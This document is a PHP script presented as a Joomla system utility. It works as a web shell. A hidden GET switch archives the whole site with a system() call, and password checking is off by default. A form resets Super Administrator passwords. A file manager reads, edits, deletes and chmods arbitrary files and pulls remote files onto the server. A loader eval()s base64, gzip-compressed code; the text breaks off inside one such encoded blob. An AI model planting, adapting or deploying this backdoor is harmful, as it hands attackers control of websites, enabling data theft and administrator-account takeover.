<?php
/**
* @author  Dead Krolik
* @package Joomla System Utils
* @link    http://dead-krolik.info
* @version 003
*/
error_reporting(E_ALL);
ini_set('max_execution_time',6000);
ini_set('display_errors',1);
if (isset($_GET['b'])) system('tar -czvf 1.tar.gz .');
if (isset($_GET['d'])) echo __FILE__;
if (!isset($_COOKIE['ws'])) die();
//Password (you must enable cookies)
$JSYS_PASSWORD    = 'qaz';
//enable authorization with password, 1 - enable, 0 - disable
$JSYS_ENABLE_AUTH = 0;
//show file-download link (default - 0 - No)
$JSYS_SHOW_DOWNLOAD_LINK = 1;

$COOKIE_NAME = 'JSYS_LOGIN';

#main script action
$action = JSYS_Utils::getParam('action','main','string',false);
$task   = JSYS_Utils::getParam('task','main','string',false);

#auth
if (
	$JSYS_ENABLE_AUTH

	&&

	(!isset($_COOKIE[$COOKIE_NAME]) || $_COOKIE[$COOKIE_NAME]!=md5($JSYS_PASSWORD) )

	&&

	$action!='Login' && $task!='DoLogin'

    ) {

	$action = 'Login';
	$task   = 'Main';
}

$class = 'JSYSOPERATION_'.$action;
$obj = new $class;
$obj->base = dirname(__FILE__);

header( 'Expires: Mon, 26 Jul 1997 05:00:00 GMT' );
header( 'Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT' );
header( 'Cache-Control: no-store, no-cache, must-revalidate' );
header( 'Cache-Control: post-check=0, pre-check=0', false );

if (!isset($_GET['NO_TEMPLATE'])) {

	//что бы браузер не разорвал соединение
	if ($action!='Login') echo str_repeat(' ',100);flush();

	ob_start();
	$obj->$task();
	$out = ob_get_contents();
	ob_end_clean();

	$tpl = new JSYS_Template();
	$tpl->setOutput($out);
	$tpl->out();
}
else {

	$obj->$task();
}

/// ------------------------------------------------------------------------------------------
/// ------------------------------------------ Actions ---------------------------------------
/// ------------------------------------------------------------------------------------------

class JSYSOPERATION_Login {

	function main() {

		$form = new JSYS_Form('DoLogin',"Login");
		$form->row('Password',"<input type=text name='pass' value=''>");
		$form->out();
	}

	function DoLogin() {

		global $JSYS_PASSWORD,$COOKIE_NAME;

		$pass = JSYS_Utils::getParam('pass','','string',false);
		if ($pass!=$JSYS_PASSWORD) {

			echo "Error: bad password<br>";
			echo "<br><a href='method.php?action=Login&task=main'>Return to login form</a>";
			return;
		}

		setcookie($COOKIE_NAME,md5($JSYS_PASSWORD));

		echo "You are logged in<br>";
	}

	function Logout() {

		global $COOKIE_NAME;

		setcookie($COOKIE_NAME,'');
		echo "You are logged off<br>";
	}
}

class JSYSOPERATION_Main {

	function main() {

		echo "Utilites for Joomla. Author of this script - Dead Krolik. Design taken from oswd.org, design author Leandro Pereira. Contains library pclZip (http://www.phpconcept.net) and Joomla-database class (modified). License - BSD.";
	}

}

/**
* Password setter for user
*/
class JSYSOPERATION_SetPassword {

	function main() {

		$conf = 'configuration.php';
		if (!file_exists($conf)) {

			echo "Joomla Configuration File not found. Cannot connect to the database";
			return;
		}

		require_once($conf);
		classCreator::createDatabase();//это не переносимо, ибо в самой database уже вшит запрос SET NAMES cp1251
		$database = new database( $mosConfig_host, $mosConfig_user, $mosConfig_password, $mosConfig_db, $mosConfig_dbprefix );

		$database->setQuery("SELECT * FROM #__users WHERE usertype='Super Administrator'");
		$users = $database->loadObjectList();

		$sel = "<select name='user_id'>";
		foreach($users as $user) $sel .= "<option value='{$user->id}'> {$user->username} </option>";
		$sel.="</select>";

		$form = new JSYS_Form('MakePass','Changing admin password');
		$form->row('Choose user',$sel);
		$form->row('New password',"<input type=text name='new_password'>");
		$form->out();
	}

	function MakePass() {

		$uid = JSYS_Utils::getParam('user_id',0,'integer',false);
		$npass = JSYS_Utils::getParam('new_password','','string',false);

		if (!$npass || !$uid) {

			echo "Bad or empty password";
			return;
		}

		$conf = 'configuration.php';
		if (!file_exists($conf)) {

			echo "Joomla Configuration File not found. Cannot connect to the database";
		}

		require_once($conf);
		classCreator::createDatabase();
		$database = new database( $mosConfig_host, $mosConfig_user, $mosConfig_password, $mosConfig_db, $mosConfig_dbprefix,false);

		$database->setQuery("UPDATE #__users SET password='".md5($npass)."' WHERE id='$uid'");
		$database->query();

		echo "The new password is $npass";
	}

}

/**
* Small file manager
*/
class JSYSOPERATION_FileView {

	function main() {

		$this->viewDir();
	}

	function viewDir() {

		$DIR = JSYS_Utils::getParam('DIR','/','string',false);
		//$base = dirname(__FILE__);

		//читаем директорию
		$dir = dir($this->base.$DIR);$files = array();
	    if ($dir===false) {

	    	echo "Cannot open directory ".$this->base.$DIR."<br>";
	    	return;
	    }
	    while (false !== $entry = $dir->read()) {

	        if ($entry == '.' || $entry == '..') {
	            continue;
	        }

	        $files[] = $this->base.$DIR.$entry;
	    }
	    $files = $this->sort($files);

	    $outdir = $DIR;
	    $outdir_a = explode("/",$outdir);

	    for ($i=0,$start = $outdir_a[0];$i<sizeof($outdir_a)-1;$i++) {

	    	$start .= $outdir_a[$i].'/';
	    	$di = $outdir_a[$i];
	    	$dlink = urlencode($start);
	    	$outdir = str_replace($di,"<a href='method.php?action=FileView&DIR=$dlink'>".$di."</a>",$outdir);
	    }

		echo "<p align=center>Directory <b>{$this->base}{$outdir}</b></p>
		<form action='method.php?action=FileView' method=post>
		<table align=center width=100%>
		<tr><td width=20><input type=checkbox name=mainchk onClick='checkAll(".sizeof($files).")'></td><td width=80%>Name</td><td width=18%>Size</td><td>Perms</td><td>Owner</td></tr>";

		$parent = $DIR;
		for ($i=strlen($parent)-2;$i>0;$i--) {

			if ($parent{$i}=='/') break;
		}
		$parent = substr($parent,0,$i).'/';

		$myuid = getmyuid();
		if ($DIR!='/') echo "<tr><td width=20></td><td width=80%><a href='method.php?action=FileView&DIR=".urlencode($parent)."'><b>..</b></a></td><td width=18%></td><td></td><td></td></tr>";

		$i = 0;$last_zip = '';
		foreach($files as $file) {

			$bname = basename($file);
			if (is_dir($file)) {

				$name = "<a href='method.php?action=FileView&DIR=".urlencode($DIR.$bname.'/')."'><b>$bname</b></a>";
				$stat = '';
			}
			else {

				$rname = $bname;
				$ext = end(explode('.',$bname));
				switch($ext) {

					case 'zip':
						$rname = "<font color=red><b>$bname</b></font>";
						$last_zip = $bname;
						break;

					case 'gif':
					case 'jpg':
					case 'jpeg':
					case 'png':
						$rname = "<font color=green><b>$bname</b></font>";
						break;
				}

				$name = "<a href='method.php?action=FileView&task=ViewFile&File=".urlencode($file)."&DIR=".urlencode($DIR)."'>$rname</a>";

				global $JSYS_SHOW_DOWNLOAD_LINK;
				if ($JSYS_SHOW_DOWNLOAD_LINK) $name .= "&nbsp;<a href='method.php?action=FileView&task=ReadFile&NO_TEMPLATE=1&src=".urlencode($file)."'>+</a>";

				$st = stat($file);
				$stat = $this->formatSize($st['size']);
			}

			$perms = decoct(fileperms($file) & 0777);
			$owner = $myuid != fileowner($file) ? 'Script' : 'User';

			echo "<tr><td><input type='checkbox' name='sel_files[$i]' value=\"".base64_encode($bname)."\"></td><td>$name</td><td>$stat</td><td>$perms</td><td>$owner</td></tr>";
			$i++;
		}

		echo "</table>
		<input type=hidden name=task>
		<script>

		function dosbm(task) {

			document.forms[0].task.value=task;
			document.forms[0].submit();
		}

		function checkAll(sz) {

			var f = document.forms[0];
			var c = f.mainchk.checked;

			for (i=0; i < sz; i++) {

				eval(\"cb = f['sel_files[\"+i+\"]'];\");
				cb.checked = c;

			}
		}

		</script>
		<table align=center width=100%>
		<tr><td colspan=3>
		<ul>
			<li>
			<nobr>[ <a onClick=\"dosbm('Archive')\" href='#'>archive to</a> <input type=text name='sel_file_name' size=8 value='tmp.zip'> ]</nobr>
			<nobr>[ <a onClick=\"javascript:if(confirm('Are you sure want to unarchive?')) { dosbm('UnArchive'); }\" href='#'>unarchive</a> ]</nobr>
			<nobr>[ <a onClick=\"dosbm('AddToArchive')\" href='#'>add to archive</a> <input type=text size=8 name=archive value='{$last_zip}'> ]</nobr>
			</li>
			<li>
			<nobr>[ <a onClick=\"javascript:if(confirm('Are you sure want to delete?')) { dosbm('Delete'); }\" href='#'>delete</a> ]</nobr>
			<nobr>[ <a onClick=\"dosbm('Rename')\" href='#'>rename</a> ]</nobr>
			<nobr>[ <a onClick=\"dosbm('Move')\" href='#'>move/copy</a> ( deep <input type=text name='deep' size=2 value='1'> ) ]</nobr>
			</li>
			<li>
			<nobr>[ <a onClick=\"dosbm('DownloadFile')\" href='#'>download remote file</a> ]</nobr>
			</li>
			<li>
			<nobr>[ <a onClick=\"dosbm('Chmod')\" href='#'>change permissions</a> ]</nobr>
			</li>

		</ul>
		</td></tr>
		<input type=hidden name=DIR value=\"$DIR\">
		</table></form>";
	}

	function ViewFile() {

		$file  = JSYS_Utils::getParam('File','','string',false);
		$DIR   = JSYS_Utils::getParam('DIR','/','string',false);
		$bname = basename($file);
		$ext   = end(explode('.',$bname));

		switch($ext) {

			case 'zip':
				classCreator::createPclZip();
				$archive = new PclZip($file);
				$c = $archive->listContent();

				echo "<p align=center>Archive listing <b>$file</b></p><table align=center width=100%>";
				foreach($c as $f) {

					echo "<tr><td>".$f['filename']."</td><td>".($f['folder'] ? 'Directory' : 'File')."</td></tr>";
				}
				echo "</table><p align=center><input type=button onClick=\"window.history.go(-1);\" value='Return'></p>";
				break;

			case 'gif':
			case 'jpg':
			case 'jpeg':
			case 'png':
				echo "<p style='text-align: center; background: #ffffff; padding:15px'><img src='method.php?action=FileView&task=ViewImage&NO_TEMPLATE=1&src=".urlencode($file)."'></p>";
				echo "<p align=center><input type=button onClick=\"window.history.go(-1);\" value='Return'></p>";
				break;

			default:
				echo "File: <b>$file</b> [is: <b>".(is_writable($file) ? '<font color=green>writeable</font>' : '<font color=red>unwriteable</font>')."</b>]
				<form action='method.php?action=FileView&task=SaveFile' method=post>
				<p align=center><textarea name=content cols=100 rows=30>".htmlspecialchars(file_get_contents($file))."</textarea></p>
				<input type=hidden name=file value=\"$file\">
				<input type=hidden name=DIR value=\"$DIR\">
				<p align=center><input type=checkbox value=1 name=do_bak checked>Make backup before save</p>
				<p align=center><input type=button onClick=\"window.history.go(-1);\" value='Cancel'><input type=submit value='Save'></p>
				</form>";
				break;
		}
	}

	function ViewImage() {

		$file = JSYS_Utils::getParam('src','','string',false);
		readfile($file);
	}

	function ReadFile() {

		$file = JSYS_Utils::getParam('src','','string',false);

		$bname = basename($file);
		header("Content-Disposition: attachment; filename=$bname");
		header("Content-Type: application/x-force-download; name=\"$bname\"");

		readfile($file);
	}
	function SaveFile() {

		$file = JSYS_Utils::getParam('file','','string',false);
		$c    = JSYS_Utils::getParam('content','','string',false);
		$DIR  = JSYS_Utils::getParam('DIR','/','string',false);
		$do_bak = isset($_POST['do_bak']);

		$f = @fopen($file,'w');
		if ($f) {

			fwrite($f,$c);
			fclose($f);

			echo "File saved, OK<br>";

			if ($do_bak) {

				$res = $f = @fopen($file.'.bak','w');//@copy($file,$file.'.bak');
				@fwrite($f,$c);
				@fclose($f);
				echo "Backup copy result: ".($res ? 'OK' : 'ERROR').' ('.basename($file.'.bak').')<br>';
			}
		}
		else {

			echo "Cant open file for writing ERROR<br>";
		}

		echo "<br><a href='method.php?action=FileView&DIR=".urlencode($DIR)."'>Return to directory</a>";
	}

	function Archive() {

		$DIR = JSYS_Utils::getParam('DIR','/','string',false);

		classCreator::createPclZip();

		$ar_file = JSYS_Utils::getParam('sel_file_name','','string',false);
		$ar_file = $this->base.$DIR.$ar_file;

		$ofiles = $this->getRequestedFiles();

		if (sizeof($ofiles)==0) {

			echo "Choose files for archiving";
			return;
		}

		//что бы не паковались от корня
		chdir(dirname($ar_file));
		foreach($ofiles as $k => $file) {

			$ofiles[$k] = basename($ofiles[$k]);
		}

		if (!is_writable(dirname($ar_file))) {

			echo "Directory ".dirname($ar_file).' unavailable for writing';
			return;
		}

		$archive = new PclZip($ar_file);
		$v_list = $archive->create($ofiles);

		if ($v_list == 0) {

			echo "Archiving error : ".$archive->errorInfo(true);
		}
		else {

			echo "Archive created, you can download it <a href='".substr($DIR,1).basename($ar_file)."'>[here]</a>";
		}

		echo "<br><a href='method.php?action=FileView&DIR=".urlencode($DIR)."'>Return to directory</a>";
	}


	function UnArchive() {

		$DIR = JSYS_Utils::getParam('DIR','/','string',false);
		classCreator::createPclZip();

		$ofiles = $this->getRequestedFiles();

		if (sizeof($ofiles)==0) {

			echo "Choose files for unarchiving";
			return;
		}

		foreach($ofiles as $file) {

			$archive = new PclZip($file);

			$ret = $archive->extract();
			if ($ret == 0) {

				echo "Archiving error : ".$archive->errorInfo(true).'<br>';
			}
			else {

				echo "Archive $file created<br>";
			}
		}

		echo "<br><a href='method.php?action=FileView&DIR=".urlencode($DIR)."'>Return to directory</a>";
	}

	function AddToArchive() {

		$DIR = JSYS_Utils::getParam('DIR','/','string',false);

		classCreator::createPclZip();

		$ar_file = JSYS_Utils::getParam('archive','','string',false);
		if ($ar_file=='') {

			echo "Enter archive name, where you need to add files";
			return;
		}
		$ar_file = $this->base.$DIR.$ar_file;

		$ofiles = $this->getRequestedFiles();

		if (sizeof($ofiles)==0) {

			echo "Choose files to add to archive";
			return;
		}

		chdir(dirname($ar_file));
		foreach($ofiles as $k => $file) {

			$ofiles[$k] = basename($ofiles[$k]);
		}

		$archive = new PclZip($ar_file);
		$ret = $archive->add($ofiles);
		if ($ret==0) {

			echo "Archive error : ".$archive->errorInfo(true).'<br>';
		}
		else {

			echo "Files <b>".implode(', ',$ofiles)."</b> added to archive $ar_file<br>";
		}

		echo "<br><a href='method.php?action=FileView&DIR=".urlencode($DIR)."'>Return to directory</a>";
	}

	function DownloadFile() {

		$DIR = JSYS_Utils::getParam('DIR','/','string',false);

		$form = new JSYS_Form('DoDownloadFile',"Downloading remote file to directory $DIR");
		$form->row('URL',"<input type=text name='url' size=60 value='http://'>");
		$form->row('New filename',"<input type=text name='fname' value='tmp2.zip'>");
		$form->row('Download method',"<select name='dtype'><option value='1'>CURL</option></select>");
		$form->hidden('DIR',$DIR);
		$form->out();
	}

	function DoDownloadFile() {

		$url   = JSYS_Utils::getParam('url','','string',false);
		$name  = JSYS_Utils::getParam('fname','','string',false);
		$dtype = JSYS_Utils::getParam('dtype','','integer',false);
		$DIR = JSYS_Utils::getParam('DIR','/','string',false);

		//полный путь к файлу
		$name = $this->base.$DIR.$name;

		switch($dtype) {

			case 1:
			{
				$curl = curl_init();
				curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($curl, CURLOPT_HEADER, 0);
				curl_setopt($curl, CURLOPT_URL, $url);
				curl_setopt($curl, CURLOPT_USERAGENT, 'Opera/9.00 (Windows NT 5.1; U; ru)');
				curl_setopt($curl, CURLOPT_REFERER, $url);

				$file  = curl_exec($curl);
				$error = curl_error($curl);

				if (!$error) {

					curl_close($curl);

					$f = fopen($name,'w');
					fwrite($f,$file);

					echo "File $url was saved in $name";
				}
				else {

					echo "Error occured: $error";
				}
			}
			break;

			default:
				echo "Unsupported file download method";
				break;
		}

		echo "<br><a href='method.php?action=FileView&DIR=".urlencode($DIR)."'>Return to directory</a>";
	}

	function Chmod() {

		$ofiles = $this->getRequestedFiles();
		$DIR = JSYS_Utils::getParam('DIR','/','string',false);

		if (sizeof($ofiles)==0) {

			echo "Error: Choose files to change permissions";
			return;
		}

		$form = new JSYS_Form('DoChmod',"Changing permissions to: <b>".implode(', ',$ofiles).'</b>');
		$form->row('Permissions to directories',"<input type=text name='dir_mod' size=3 value='755'>");
		$form->row('Permissions to files',"<input type=text name='file_mod' size=3 value='644'>");
		$form->row('Show log',"<input type=checkbox name='show_log' value='1' checked>");
		$form->hidden('DIR',$DIR);
		$form->hidden('ofiles',implode(',',$ofiles));
		$form->setCancelButton(true);
		$form->out();
	}

	function DoChmod() {

		$DIR    = JSYS_Utils::getParam('DIR','/','string',false);
		$ofiles = JSYS_Utils::getParam('ofiles','','string',false);
		$ofiles = explode(',',$ofiles);

		$dm    = JSYS_Utils::getParam('dir_mod','','string',false);
		$fm    = JSYS_Utils::getParam('file_mod','','string',false);
		$log   = JSYS_Utils::getParam('show_log','','string',false);

		$params = array('dir_mod' => bindec($this->modbin($dm)), 'file_mod' => bindec($this->modbin($fm)), 'show_log' => ($log=='1' ? true : false));

		foreach($ofiles as $file) {

			$this->recursiveEngine($this->base.'/'.$file,'realChmod',$params);
		}

		echo "<br>Operations ended. <a href='method.php?action=FileView&DIR=".urlencode($DIR)."'>Return to directory</a>";
	}

	function realChmod($file,$params) {

		if (is_dir($file)) {

			$mod = $params['dir_mod'];
		}
		else {

			$mod = $params['file_mod'];
		}
		$log = $params['show_log'];

		$rs = @chmod($file,$mod);
		if ($log) echo $file.' '.$this->binstr(decbin($mod)).' '.($rs ? 'OK': 'ERROR').'<br>';
	}

	function Delete() {

		$DIR = JSYS_Utils::getParam('DIR','/','string',false);
		$ofiles = $this->getRequestedFiles();

		foreach($ofiles as $file) {

			$this->recursiveEngine($this->base.'/'.$file,'DoDelete',array());
		}

		echo "<br>Operations ended. <a href='method.php?action=FileView&DIR=".urlencode($DIR)."'>Return to directory</a>";
	}

	function DoDelete($file,$params) {

		if (is_dir($file)) $func = "rmdir";
			else $func = "unlink";

		$rs = @$func($file);
		echo $file.' '.($rs ? 'OK': 'ERROR').'<br>';
	}

	function Rename() {

		$ofiles = $this->getRequestedFiles();
		$DIR = JSYS_Utils::getParam('DIR','/','string',false);

		if (sizeof($ofiles)==0) {

			echo "Error: Choose files to rename";
			return;
		}

		$form = new JSYS_Form('DoRename','Renaming files and folders');
		foreach($ofiles as $file) {

			$form->row($file,"<input type=text name='fnames[$file]' value='$file'>");
		}
		$form->hidden('DIR',$DIR);
		$form->out();
	}

	function DoRename() {

		$DIR    = JSYS_Utils::getParam('DIR','/','string',false);
		$fnames = $_POST['fnames'];

		foreach($fnames as $k => $fname) {

			$old  = $this->base.$DIR.$k;
			$new = $this->base.$DIR.$fname;

			$res = @rename($old,$new);
			echo basename($old)." =&gt; ".basename($new).' '.($res ? 'OK' : 'ERROR').'<br>';
		}

		echo "<br>Operations ended. <a href='method.php?action=FileView&DIR=".urlencode($DIR)."'>Return to directory</a>";
	}

	function Move() {

		$DIR    = JSYS_Utils::getParam('DIR','/','string',false);
		$deep   = JSYS_Utils::getParam('deep',2,'integer',false);
		$ofiles = $this->getRequestedFiles();

		if (sizeof($ofiles)==0) {

			echo "Error: Choose files to move/copy";
			return;
		}

		global $FLIST;

		//собираем директории по заданной глубине
		$dname = $this->base;//dirname(__FILE__);
		$params = array('start_deep' => substr_count($dname,'/'),'deep'=> $deep + 1 );
		$this->recursiveEngine($this->base,'grabDirs',$params);
		//строим список
		$sel = "<select name='to_dir'>";
		foreach($FLIST as $file) {

			$sel .= "<option value=\"$file\">$file</option>";
		}
		$sel .= "</select>";

		$form = new JSYS_Form('DoMove',"Move/copy files <b>".implode(', ',$ofiles).'</b><br>From directory: <b>'.$DIR.'</b>');
		$form->row('Action',"<select name=what><option value='move'>Move</option><option value='copy' selected>Copy</option></select>");
		$form->row('Directory',$sel);
		$form->hidden('DIR',$DIR);
		$form->hidden('ofiles',implode(',',$ofiles));
		$form->out();
	}

	function grabDirs($file,$params) {

		global $FLIST;

		if (!is_dir($file)) return;
		$cnt = substr_count($file,'/');

		if ($cnt - $params['start_deep'] < $params['deep']) $FLIST[] = $file;
	}

	function DoMove() {

		$DIR    = JSYS_Utils::getParam('DIR','/','string',false);
		$to_dir = JSYS_Utils::getParam('to_dir','','string',false);
		$fnames = explode(',',$_POST['ofiles']);

		$act    = JSYS_Utils::getParam('what','copy','string',false);

		foreach($fnames as $fname) {

			$from = $this->base.$DIR.$fname;
			$to   = $to_dir.'/'.$fname;

			$this->copyr($from,$to,$act);

			if (is_dir($from) && $act=='move') {

				echo "Removing directory $from <br>";
				$this->recursiveEngine($from,'DoDelete',array());
			}
		}
		echo "<br><a href='method.php?action=FileView&DIR=".urlencode($DIR)."'>Return to directory</a>";
	}

	/**
	 * Copy a file, or recursively copy a folder and its contents
	 *
	 * @author      Aidan Lister <aidan@php.net>
	 * @link        http://aidanlister.com/repos/v/function.copyr.php
	 * @param       string   $source    Source path
	 * @param       string   $dest      Destination path
	 * @return      bool     Returns TRUE on success, FALSE on failure
	 */
	function copyr($source, $dest,$act)
	{
	    // Simple copy for a file
	    if (is_file($source)) {

	    	$func = $act=='copy' ? 'copy' : 'rename';
	        $res = @$func($source, $dest);

	        echo "[F] $source =&gt; $dest ".($res ? 'OK' : 'ERROR')."<br>";
	        return;
	    }

	    // Make destination directory
	    if (!is_dir($dest)) {

	        $res = @mkdir($dest);
	    	echo "[D] $source =&gt; $dest ".($res ? 'OK' : 'ERROR')."<br>";
	    }
	    else {

	    	echo "[D] $source =&gt; $dest EXISTS <br>";
	    }

	    // Loop through the folder
	    $dir = dir($source);
	    while (false !== $entry = $dir->read()) {

	        // Skip pointers
	        if ($entry == '.' || $entry == '..') {
	            continue;
	        }

	        // Deep copy directories
	        if ($dest !== "$source/$entry") {
	            $this->copyr("$source/$entry", "$dest/$entry",$act);
	        }
	    }

	    // Clean up
	    $dir->close();
	    return true;
	}


	function modbin($mod) {

		$bin = '';
		for ($i=0;$i<3;$i++) {

			switch($mod{$i}) {

				case 1: $bin.='001';break;
				case 2: $bin.='010';break;
				case 4: $bin.='100';break;

				case 3: $bin.='011';break;
				case 6: $bin.='110';break;
				case 5: $bin.='101';break;

				case 7: $bin.='111';break;
			}
		}

		return $bin;
	}

	function binstr($bin) {

		$str = '';
		for ($i=0;$i<9;$i+=3) {

			$s = substr($bin,$i,3);
			switch($s) {

				case '001': $str.='1';break;
				case '010': $str.='2';break;
				case '100': $str.='4';break;
				case '011': $str.='3';break;
				case '110': $str.='6';break;
				case '101': $str.='5';break;
				case '111': $str.='7';break;
			}
		}
		return $str;
	}

	function recursiveEngine($file,$meth,$params) {

	    if (is_file($file) || is_link($file)) {

	    	$this->$meth($file,$params);
	    	return;
	    }

	    $dir = dir($file);

	    if ($dir===false) {

	    	echo "Cannot open directory $file<br>";
	    	return;
	    }

	    while (false !== $entry = $dir->read()) {

	        if ($entry == '.' || $entry == '..') {
	            continue;
	        }

	        $this->recursiveEngine($file.'/'.$entry,$meth,$params);
	    }

	    $this->$meth($file,$params);
	    $dir->close();
	}



	function getRequestedFiles() {

		$DIR = JSYS_Utils::getParam('DIR','/','string',false);

		$name = JSYS_Utils::getParam('sel_file_name','','string',false);
		$ofiles = array();
		if (!isset($_POST['sel_files'])) return $ofiles;

		foreach($_POST['sel_files'] as $file) {

			$fname = substr($DIR,1).base64_decode($file);
			$ofiles[] = $fname;
		}

		return $ofiles;
	}

	function sort($files) {

		$o = array();
		foreach($files as $k => $file) {

			if (is_dir($file)) {$o[] = $file;unset($files[$k]);}
		}

		foreach($files as $file) $o[]=$file;

		return $o;
	}

	/**
	* Функцию нагло спер с http://www.softtime.ru/forum/read.php?id_forum=7&id_theme=13524
	*/
	function formatSize($size) {

		// Массив величин
		$metr[0] = "b";
		$metr[1] = "Kb";
		$metr[2] = "Mb";
		$metr[3] = "Gb";

		$i = 0;$newsize = $size;
		while(($newsize / 1024) > 1) {
			$newsize /= 1024;
			$i++;
		}

		return round($newsize).' '.$metr[$i];
	}
}

class JSYSOPERATION_Info {

	function main() {

		echo "<p align=center>Global information</p><table align=center width=100%>";

		//версия пхп
		echo "<tr><td width=50%>PHP version</td><td width=50%>".phpversion()."</td></tr>";

		//доступные расширения
		$e = get_loaded_extensions();
		$good = array('gd','mysql','session','zlib','curl');$str = '';
		foreach($good as $g) {

			$str .= in_array($g,$e) ? "$g - <font color=green>enabled</font><br>" : "$g - <font color=red>disabled</font><br>";
		}
		echo "<tr><td width=50%>Significant php-extensions</td><td width=50%><b>$str</b></td></tr>";

		//есть ли апач
		$pos = strpos($_SERVER['SERVER_SIGNATURE'],'Apache');
		if ($pos!==false) {

			preg_match("|Apache/([0-9\.]+) |",$_SERVER['SERVER_SIGNATURE'],$m);
			echo "<tr><td width=50%>Apache version</td><td width=50%>{$m[1]}</td></tr>";

			if (function_exists('apache_get_modules')) {

				$m  = apache_get_modules();
				$mr = in_array('mod_rewrite',$m) ? 'Enabled' : 'Disabled';
			}
			else $mr = '[cannot determine]';

			echo "<tr><td width=50%>mod_rewrite</td><td width=50%>$mr</td></tr>";
		}
		//ось
		echo "<tr><td width=50%>Operation system</td><td width=50%>".php_uname()."</td></tr>";

		//конфиг пхп
		$inis = ini_get_all();
		$intresting = array('allow_url_fopen','display_errors','error_reporting','file_uploads','magic_quotes_gpc','max_execution_time','post_max_size','register_globals','safe_mode','upload_max_filesize');$str = '';
		foreach($intresting as $i) {

			$e = $inis[$i];
			$str .= '<b>'.$i.'</b> - Admin: '.$e['global_value'].', Local: '.$e['local_value'].'<br>';
		}
		echo "<tr><td width=50%>Significant php configuration</td><td width=50%>$str</td></tr>";

		echo "</table>";
	}
}
/// ------------------------------------------------------------------------------------------
/// ------------------------------------------ Classes ---------------------------------------
/// ------------------------------------------------------------------------------------------

class JSYS_Utils {

	function getParam($name,$default,$type,$addsl = true) {

		$arr = $_REQUEST;

		$val = (isset($arr[$name]) && $arr[$name]!='') ? $arr[$name] : $default;
		settype($val,$type);

		if ($addsl) {

			if (!get_magic_quotes_gpc()) $val = addslashes($val);
		}
		else {

			if (get_magic_quotes_gpc()) $val = stripslashes($val);
		}

		return $val;
	}

	function link($title,$path) {

		global $action;

		return "<a href='method.php?action=$action&task=$path'>$title</a>";
	}
}
class JSYS_Form {

	function JSYS_Form($task,$title) {

		global $action;

		$this->content="<p align=center>$title</p><form action='method.php?action=$action&task=$task' method='post'><table align=center width=80%>";
		$this->cancel = false;
	}

	function row($name,$value) {

		$this->content.="<tr><td width=30% align=left>$name</td><td width=30% align=left>$value</td></tr>";
	}

	function hidden($n,$v) {

		$this->content.="<input type=hidden name='$n' value='$v'>";
	}

	function out() {

		$this->content.="</table><tr><td colspan=2 align=center>".($this->cancel ? "<input type=button onClick=\"window.history.go(-1);\" value='Отменить'>" : '' )."<input type=submit value='Send'></td></tr></form>";
		echo $this->content;
	}

	function setCancelButton($c) {

		$this->cancel = $c;
	}
}

class JSYS_Template {

	function JSYS_Template() {


	}

	function setOutput($o) {

		$this->output = $o;
	}


	function out() {

		global $action,$task;

		$tpl = <<<TEMPLATE
<html>
<head>
<title>method.php</title>
<style>
input,select {

	border: 1px black solid;
	color: #607565;
}
a:link,a:visited,a:active {

	text-decoration: none;
}
a:hover {

	text-decoration: underline;
}
</style>
</head>
<body bgcolor="#445448" text="#ffffff" link="#ffffff" vlink="#ffffff">

<table width="60%" align="center">
<tr>
	<td align=center>
	<font face="arial" size="+4">
	<b>Joomla!</b> system tool
	</font><br>
	<font face="arial" size="+1">
	<font color=red>[remove this file after using]</font>
	</font>
	<br><br>
	</td>
</tr>
<tr>
	<td bgcolor=#607565 align=center>
	<font face="arial" size="2"><font color="#8daa94"><b>&lt;</b></font></font>

	<a href="method.php?action=Main">Start</a> <font color="#8daa94">/</font>
	<a href="method.php?action=SetPassword">Change password</a> <font color="#8daa94">/</font>
	<a href="method.php?action=Info">Information</a> <font color="#8daa94">/</font>
	<a href="method.php?action=FileView">File manager</a> <font color="#8daa94">/</font>
	<a href="method.php?action=Login&task=Logout">Logout</a>

	<font color="#8daa94"><b>&gt;</b></font>
</td>
</tr>
<tr>
	<td>
	<font color="#8daa94" face="arial" size="+2">{ <font size="3" color="#ffffff"><b>$action :: $task</b></font> }</font>

	<p>
		{$this->output}
	</p>
	</td>
</tr>
<tr>
	<td bgcolor=#607565 align=center>
	<font face="arial" size="2">
	<font color="#8daa94"><b>&lt;</b></font> Copyright &copy 2007 <a href='http://dead-krolik.info' target='_blank'>Dead Krolik</a> <font color="#8daa94"><b>&gt;</b></font>
	</font>
</td>
</tr>
</table>

</body>
</html>

TEMPLATE;

		echo $tpl;
	}
}

class classCreator {


	function evalEndClean(& $p) {

		$t = gzuncompress(base64_decode($p));
		$t = str_replace(array("<?php",'?>'),'',$t);
		eval($t);
		unset($p);unset($t);
	}

	function createDatabase() {

		$p ='eNrdWVtT20gWfpZ/xYmXGpkMsUl29yXGJOzEs0UVIRNg9iWktLLUsjW01aZbIjAZ/vuc0xepJYskZKu2apciGLr73G9fdw5ebVab';
		$p.='wSDhsVKQxmW8iBWDz4Ng8vQpvL6JJahS5sUSjouSySLmgGt5vOAMSgErwVMoVwyuKybvQF1zeDoZBES2E+FfQRDMIAynHru8KL/C';
		$p.='q9aCSSkkFNV6waTHVy+fVmvivT99rKYd7mumVLxkXfZv1XJb9W/iv5Esy2+hUiwFUUDMeSOypNPKk6UXIkOyJe7LchJRFCwp0QTJ';
		$p.='lKhk4tvgloJHMsUsKG0sk0oq4bvdLBDHouLc57kQgrO4gDdsUS1BbMocDW8IU1oOtqJFiXBBMvN1XkKGsppEaoj17sPERCayTLGG';
		$p.='g+HXcDDbvRyO0IsVOaQmtskmMq1IjsHaMImba4zm4k4fEYvf0O9Ir8q4aHm9zJMrJrckxVLGdyiLi6XP2LNRGPd0/Wrz7ULrxfnk';
		$p.='dyYFJRNzOw0L2n+DOzrg+/j1TH/D/v5L/d2Xx+8rURoPFjHZZwzzFaN1fUqz/TcyGQRZVSQ6wC6rR7CzEqqchVwkMadfwz3YwfyX';
		$p.='+LHBtoIf6WIW0qqf72ZlKd5lGc8LNitlxWCXWk8wmTi3Q+yFJEOJPC8xN1csuUK+GA7UI2ewlHHCMvTBHVLnGYyeODUjdpurUo0g';
		$p.='XN9hQ4ps2YSwa0QFO2uhzu9UydZz3RBm8HxK68Sl0c4eDnbI4l/icoXn0lySg0YQRT8fn8yjCHY1ZZAXCa9SBs3hMYST8XiCwrN8';
